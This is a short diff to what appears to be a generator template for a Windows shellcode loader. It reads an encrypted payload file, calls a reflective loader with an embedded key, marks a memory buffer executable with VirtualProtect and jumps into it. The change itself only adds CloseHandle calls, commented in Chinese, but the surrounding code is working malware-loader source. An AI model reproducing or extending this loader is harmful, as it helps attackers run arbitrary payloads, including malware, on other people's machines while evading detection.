@@ -165,6 +165,7 @@ int main() {{
     PBYTE pBin = (PBYTE)malloc(binSize);
     DWORD readFileSize;
     ReadFile(hFile, pBin, binSize, &readFileSize, NULL);
+    CloseHandle(hFile); // 避免 bin 继续被占用
     size_t key = {hex(struct.unpack('<Q', key)[0])};
     if (((int(*)(...))((PBYTE)RefLoader + {offset}))(pBin, binSize, (PBYTE)&key)) {{
         Gadget(); // 防止 Gadget 不存在
@@ -218,6 +219,7 @@ int main() {{
     PVOID pShell = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD readFileSize;
     ReadFile(hFile, pShell, shellSize, &readFileSize, NULL);
+    CloseHandle(hFile); // 避免 bin 继续被占用
     DWORD oldProtect;
     VirtualProtect(pShell, shellSize, PAGE_EXECUTE_READ, &oldProtect);
     if (((int(*)())pShell)()) {{
